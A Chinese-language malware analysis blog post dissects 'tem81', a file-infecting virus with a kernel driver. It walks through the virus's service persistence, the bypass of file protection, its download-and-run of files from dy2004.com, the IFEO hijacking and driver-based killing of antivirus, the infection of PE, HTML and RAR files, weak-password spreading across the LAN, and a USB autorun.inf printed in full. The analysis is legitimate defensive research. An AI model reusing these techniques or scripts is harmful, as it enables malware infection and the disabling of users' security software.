病毒分析-驱动感染型

Dec 3, 2013 | virus

一个附带驱动的感染型病毒tem81简略行为分析

调试环境：

Windows XP SP3, OD, IDA, 010Editor等

病毒简介

病毒运行后会自我复制到被感染系统目录“%SystemRoot%\system32\dllcache\”文件夹下，重新命名为“systembox.bak”。
在“%SystemRoot%\system32\”和%SystemRoot%\system32\dllcache\”文件夹下释放经过加壳保护的恶意DLL组件“*.dll”（文件名从netsvcs服务组中依次取得，一般从“6to4”开始），
还会在“%SystemRoot%\system32\drivers\”文件夹下释放恶意驱动程“WmiSvc.sys”，用以结束大量安全软件的进程，
同时利用注册表映像文件劫持功能，干扰这些安全软件的正常运行。
另外注册自身为系统服务，以此实现开机自启，感染扩展名为“.exe”、“.asp”、“.htm”、“.html”、“.aspx”及“.RAR”文件，通过自带的密码表对存在弱口令的网络中其他计算机进行连接，一旦连接成功便会进行感染。

病毒运行过程

创建互斥事件检测自身是否运行

1创建互斥事件4F9E860C-9BE9-474b-8FD1-F0EEDB20C77B。
2创建失败或者该互斥事件已经存在，标明病毒已经运行，则在临时目录下边生成一个批处理文件TempDel.bat，之后在里边写入数据
copy /Y “C:\Documents and Settings\Admin\桌面\tem81.exe” “”
:runagain
del “C:\Documents and Settings\Admin\桌面\tem81.exe”
if exist “C:\Documents and Settings\Admin\桌面\tem81.exe” goto runagain
del “C:\DOCUME~1\Admin\LOCALS~1\Temp\TempDel.bat”
3调用 ShellExecuteA执行，功能：删除自身，删除临时文件。
4最后退出进程。

检测病毒是否已注册服务项（举例AppMgmt说明）

1调用函数OpenSCManagerA获得系统目录并建立一个连接到服务控制管理器并打开它的数据库。
2读取注册表HKEY_LOCAL_MACHINE下”SOFTWARE\Microsoft\Windows NT\CurrentVersion\Svchost”键名为netsvcs的所有值到缓冲区。

netsvcs 就是网络服务，要开启共享是必须有这个服务的。
3遍历注册表HKEY_LOCAL_MACHINE下”SYSTEM\CurrentControlSet\Services\%s\Parameters”子键，其中%s为netsvcs的值，从6to4开始。
4找到该目录下找到键名为ServiceDLL的键值%SystemRoot%\System32\appmgmts.dll

5判断该键值%SystemRoot%\System32\appmgmts.dll是否和病毒本身相同（病毒会在6to4下边注册一个键名为serviceDll.dll变量值为C:\WINDOWS\system32\6to4.dll的子键）。
6如过找到了说明病毒已经运行了该注册的服务项。调用函数ControlService终止该服务。
7如果没有找到该键值，则去创建该键值，创建过程如下：

创建病毒运行服务项（举例6to4.dll说明）

1调用函数CreateServiceA 循环创建服务名为6to4（数据库中从6to4开始）服务程序二进制文件的路径为”%SystemRoot%\System32\svchost.exe -k netsvcs”可被多个进程共享的自动动服务程序，并且把它加入到服务管理数据库中。
2调用函数PathFileExistsA检测C:\windows\system32\6to4.dll文件是否存在
3如果不存在则关闭系统保护创建该文件。如果存在则直接打开。

4关闭系统保护方法：
4.1获取系统信息，如果系统次版本号为2，加载sfc_os.dll，否则加载sfc.dll。
4.2调用函数MultiByteToWideChar路径转为宽字节路径
4.3加载sfc.dll，全称为system file cheak(系统文件检查)，获取#5函数地址。
4.4调用#5号api，它的作用是关闭系统文件保护60秒。

5如果遍历完数据库中所有服务项都创建失败，则进行如下步骤
5.1从WmdmPmSN，AppMgmt，Ntmssvc，Rasauto，BITS，Browser，ERSvc
其中一个服务里边创建服务项。举例释放到组建WmdmPmSN中说明：
5.2调用函数OpenServiceA打开服务项MsPMSNSv。
5.3调用函数 QueryServiceStatus获取服务MsPMSNSv运行状态。
5.4如果在运行则通过函数ControlService关闭它
5.5创建病毒运行服务项，同步骤0x3
5.6 释放被感染的DLL组建system32和dllcache下，同步骤0x4
5.7调用StartServiceA函数开启该服务项。
5.8重新运行自删除，同0x6

生成dll服务,释放DLL组建

1调用函数PathFileExistsA检测C:\windows\system32\6to4.dll文件是否存在，
如果不存在则关闭系统保护创建该文件。如果存在则直接打开。
2调用函数GetFileTime获取文件操作信息（创建，访问，修改）
3之后将偏移0xC048处0x4C00大小的资源数据写入6to4.dll文件中。
4通过函数SetFileTime设置文件操作时间为写入数据之前。
5重复步骤1–4将6to4.dll写入C:\WINDOWS\system32\dllcache\目录下。
6释放资源文件。

增加新的服务注册表项实现服务自启动

1调用函数RegOpenKeyExA打开注册表HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\6to4
2调用函数RegCreateKeyExA创建名为Parameters的新子键
3在该子键下注册一个新键，键名为serviceDll.dll变量值为C:\WINDOWS\system32\6to4.dll

开启服务，自删除

1调用StartServiceA函数开启6to4服务，运行6to4.dll。
2临时目录下生成TempDel.bat文件，写入数据：

copy /Y "C:\Documents and Settings\Admin\桌面\tem81.exe" "C:\WINDOWS\system32\dllcache\systembox.bak"
:runagain
del "C:\Documents and Settings\Admin\桌面\tem81.exe"
if exist "C:\Documents and Settings\Admin\桌面\tem81.exe" goto runagain
del "C:\DOCUME~1\Admin\LOCALS~1\Temp\TempDel.bat"

3调用 ShellExecuteA执行。
4 TempDel.bat功能：
4.1将病毒拷贝到C:\WINDOWS\system32\dllcache\systembox.bak重新运行
4.2删除自身
4.3检测自身是否存在 如果存在继续删除
4.4最后删除临时文件。
5退出进程。

释放的DLL文件分析

检测自身是否运行

1调用函数CreateEventA创建互斥事件4F9E860C-9BE9-474b-8FD1-F0EEDB20C77B
2如果创建失败或者互斥事件已经存在，则退出进程。

解密URL

1从偏移0x8488处开始的0x20个字节，先减1再与0xA5异或，即 i = (i - 1) ^ 0xA5;得到URL 地址：http://www.dy2004.com/msn/mm.txt
2从偏移0x8518处开始的0x21字节开始，如果等于0x2C则置0，否则不变，即 if ( k == 0x2C ) k = 0;得到字符串n.Administrator.Guest.admin.Root
3从偏移0x8540处开始的0x26C字节开始，同2的方法相同，得到弱口令数据块。

4从偏移0x87B0处开始，如果等于0x2C或0x7C则置0，否则不变，解密出杀毒软件进程名数据块

创建线程0x10003F33访问指定的链接

1建立socket链接，访问www.dy2004.com
2判断要打开的链接是HTM网页还是ASP网页
3如果是htm网页，创建死循环，2分钟循环一次，调用函数ShellExecuteExA用IE打开链接http://www.dy2004.com/msn/mm.htm，打开成功，延时30秒退出线程。
4如果是ASP网页，则获取计算机名字，建立socket链接，调用send函数向http://www.dy2004.com/msn/mm.asp:50发送数据
GET /msn/mm.htm?name=TEST-D43880C7BB HTTP/1.1..User-Agent: Mozil
0006EE98 la/4.0..Host: www.dy2004.com.

创建线程0x100018d7下载恶意文件并执行

1调用函数urlmon.URLDownloadToFileA从http://www.dy2004.com/msn/mm.txt下载数据到临时文件目录C:\DOCUME~1\Admin\LOCALS~1\Temp\下的TempLocal.txt文件中。
2通过 GetUrlCacheEntryInfoA获得本地缓存文件地址，然后将缓存文件删除。
3获取TempLocal.txt文件大小size，之后申请一个size+0x20大小的对象。
4将TempLocal.txt数据读取到对象中，删除TempLocal.txt
5在对象中进行特殊字符查找，最终生成一个URL链接和一个文件名，之后调用函数URLDownloadToFileA继续从该链接下载指定的文件。
6检测下载的文件是否存在，之后创建一个以该文件命名的具有IE进程权限的用户进程，如果创建失败，则调用ShellExecuteA直接打开。

创建线程0x10003A8D注册驱动服务，终止杀软进行

1打开驱动服务NtBox。
2打开失败则注册该驱动服务。
3 打开C:\WINDOWS\system32\drivers\WmiSvc.sys.
4加载偏移0xA070处0xD00的资源到内存。将该数据写入WmiSvc.sys文件中。
5调用函数PathFileExistsA验证文件是否存在.
6调用CreateServiceA生成WmiSvc服务项，调用StartServiceA开启该服务项。
7重新打开驱动服务NtBox，获得驱动句柄hDevice
8创建死循环遍历系统进程，2秒循环一次，找到除avp.exe之外的所有杀毒软件进程，调用函数DeviceIoControl想驱动服务发送请求，终止杀软进程。

DeviceIoControl参数如下：
0006F3B8   000000B0  |hDevice = 000000B0 (window) //WmiSvc.sys驱动服务中NtBox句柄
0006F3BC   00222008  |IoControlCode = 222008
0006F3C0   0006F3D8  |InBuffer = 0006F3D8   //存放杀软进程ID
0006F3C4   00000004  |InBufferSize = 4
0006F3C8   00000000  |OutBuffer = NULL
0006F3CC   00000000  |OutBufferSize = 0
0006F3D0   0006F3DC  |pBytesReturned = 0006F3DC
0006F3D4   00000000  \pOverlapped = NULL

9驱动服务WmiSvc.sys终止杀软进程功能实现：
9.1将欲结束的进程PID传递到内核驱动WmiSvc.sys，驱动通过IoControlCode 找到派遣功能

9.2读取IRP结构中+0xC处为AssociatedIrp，AssociatedIrp+0xC处的SystemBuffer中应用层传输的数据，即进程ID
9.3驱动通过函数 PsLookupProcessByProcessId得到进程的EPROCESS结构
调试中返回指针为0x863005d0，在windbg输入命令验证：
kd> !process 0 0

4通过EPROCESS结构偏移0x190处找到线程的链表头,该链表中存放ThreadListEntry，之后将ThreadListEntry-0x22C得到该线程的ETHREAD结构地址。


5遍历这个链表，调用PspTerminateThreadByPointer将杀软线程全部杀掉，之后杀软进程便会退出。

创建线程0x10004618利用注册表映像文件劫持功能干扰杀软正常运行

1通过GetNamedSecurityInfoA，BuildExplicitAccessWithNameA，SetEntriesInAclA，SetNamedSecurityInfoA函数为注册表MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options重建一个新的访问控制列表
2在注册表SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options下创建杀毒软件进程名字的子项

3之后在该子项下生成一个键名为Debugger键值为ntsd -d的子键。

4 ntsd为系统自带的进程调试工具，这样杀软运行时会自动打开系统调试器，从而干扰了杀软的正常工作。

劫持host，自保护

1.循环获取系统运行时间，判断是否大于3分钟，如果不大于，则延时1秒，如果大于，则继续执行。
2.打开C:\WINDOWS\system32\drivers\etc\目录下hosts文件，覆盖写入
127.0.0.1 localhost.
3.检测病毒母体文件C:\WINDOWS\system32\dllcache\systembox.bak是否存在。
4.调用函数CreateFileMappingA将母体映射到内存中。

创建线程0x1000311F感染系统文件

1创建互斥事件94A7A7DA-6D69-472e-8981-DBC71C77FC66和207C6A67-5861-4aaf-A336-C255C7AE4C57
2调用函数GetLogicalDriveStringsA获系统所有磁盘。
3调用函数GetDriveTypeA获取磁盘类型
4非A:\和B:\进行感染。

感染exe文件

1调用函数WinVerifyTrust验证数字签名6B C5 AA 00 44 CD D0 11 8C C2 00 C0 4F C2 95 EE 10 00 00 00 （验证失败）
2调用GetFileTime获取文件时间信息。
3将待感染的exe文件映射到内存。对PE格式进行检测，然后添加新节为可写代码段，块数目加1

4在PE最后写入偏移0x6450处大小为0x1F7字节的数据。
5将0x5C00大小的病毒母体文件拷贝到后边。
6最后将病毒母体的MZ头四个字节改为其本身大小0x5C00
7调用函数SetFileTime设置文件时间信息为感染之前

8当受感染的PE文件运行，感染的前0x1F7的代码用于病毒母体进行重定位修复IAT等操作，之后病毒母体得以正确运行。

感染htm\html\asp\aspx

1调用GetFileTime获取文件时间信息。
2读取htm文件最后256个字节，查找字符串“<iframe”，如果找到了说明已经感染过，则不感染，找不到则进行感染。
3之后在最后写入感染代码。
4调用SetFileTime设置文件时间信息为感染之前。

感染RAR文件

创建感染线程0x1000269E，以感染test.rar为例说明
1找到C:\Program Files\WinRAR目录下的rar.exe，调用函数PathFileExistsA检测该文件是否存在，如果存在则进行感染。
2获取待感染test.rar文件大小，如果大于等于0x2800小于等于0xA00000则进行感染。
3调用GetFileTime获取文件时间信息。
4 生成字符串C:\Program Files\WinRAR\Rar.exe X -ibck “c:\test.rar” “C:\DOCUME~1\Admin\LOCALS~1\Temp\test\”
5将字符串作为函数CreateProcessA参数将文件解压至系统临时目录下与待感染文件同名的文件夹下边。
6调用PathFileExistsA检测解压文件夹是否存在。
7删除原始待感染文件。
8 创建感染线程（0x1000262c）去感染PE文件和htm等，目的是为了感染解压过的文件。
9 生成字符串C:\Program Files\WinRAR\Rar.exe M -ibck -r -o+ -ep1 “c:\test.rar” “C:\DOCUME~1\Admin\LOCALS~1\Temp\test*“
10将字符串作为函数CreateProcessA参数将临时文件下被感染过的文件夹压缩到原来的系统目录下。
11调用SetFileTime设置文件时间信息为感染之前。
12调用函数RemoveDirectoryA删除临时文件目录下生成的test文件夹。

感染局域网

创建线程0x10005265感染终端服务器文件，局域网和Internet
1 加密URL http://www.dy2004.com/msn/mm.exe 异或0xF7

2通过使用WNetOpenEnum函数获得所有网络资源的信息过程，使用WNetEnumResource函数获取所有网络信息，之后在终端服务器上创建文件Microsoft Terminal Services\desktop.txt测试对终端服务器是否具有访问权限。
3如果具有访问权限，则删除该文件，调用感染线程对终端服务器的文件进行感染。感染过程同感染线程0x1000311F
4最后使用WNetCloseEnum函数结束枚举网络资源的过程。
感染局域网
5通过函数WNetAddConnection2A连接到同网段中的其他IP地址，如果需要账户密码，则从解密出来的账户和弱口令进行配置，之后调用CopyFile函数将C:\WINDOWS\system32\dllcache\systembox.bak病毒母体拷贝到目标机器C盘上并命名为bootfont.exe
6调用函数Winexec隐藏运行目标机器上的bootfont.exe对目标机器进行感染。
7最后调用WNetCancelConnection2A关闭链接。
感染非局域网（Ineternet）
8通过函数WNetAddConnection2A与其他网段IP建立pipe管道，之后打开命名管道\pipe\browser，如果需要账户密码，则从解密出来的账户和弱口令进行配置，
之后通过TransactNamedPipe函数通过管道传输感染数据到目标机器。

感染可移动磁盘

创建线程0x100058E1感染可移动磁盘
1调用函数GetLogicalDrives和GetDriveTypeA获取磁盘和磁盘类型，如果是可移动磁盘则进行感染。
2 调用函数PathFileExistsA查看可移动磁盘根目录下是否存在autorun.inf文件，如果不存在则创建。
3 创建成功后写入0x138字节的数据，实现自启动。

[autorun]
OPEN=recycle.{645FF040-5081-101B-9F08-00AA002F954E}\Ghost.exe
shell\open=打开(&O)
shell\open\Command=recycle.{645FF040-5081-101B-9F08-00AA002F954E}\Ghost.exe Bak
shell\open\Default=1
shell\explore=资源管理器(&X)
shell\explore\Command=recycle.{645FF040-5081-101B-9F08-00AA002F954E}\Ghost.exe Bak

3在可移动磁根目录下创建目录recycle.{645FF040-5081-101B-9F08-00AA002F954E}并调用函数PathFileExistsA检测是否创建成功。
4将C:\WINDOWS\system32\dllcache\systembox.bak病毒母体拷贝到新建的目录recycle.{645FF040-5081-101B-9F08-00AA002F954E}下，并命名为Ghost.exe
5调用函数SetFileAttributesA将Ghost.exe和autorun.inf设置为READONLY|HIDDEN|SYSTEM属性。
至此可移动磁盘感染完成。

创建线程0x10005ACB下载恶意文件并运行

1从http://www.dy2004.com/msn/mm.txt下载Newtemp_387.exe到临时文件目录C:\DOCUME~1\Admin\LOCALS~1\Temp\下。过程同线程0x100018d7前四步.
2对下载文件做一些字符串检验，读取头两字节内容判断是否为MZ头，检验过后创建线程0x10005ACB
3将自身dll文件目录（6to4.dll）作为参数传递给函数CreateProcessA创建进程Newtemp_387.exe
4枚举当前进程所有线程，找到自身线程调用函数TerminateThread将其终止。
5调用函数UnmapViewOfFile释放之前映射的母体对象，删除C:\WINDOWS\system32\dllcache目录下的systembox.bak（病毒母体）文件。
6退出线程，释放互斥事件等收尾工作。
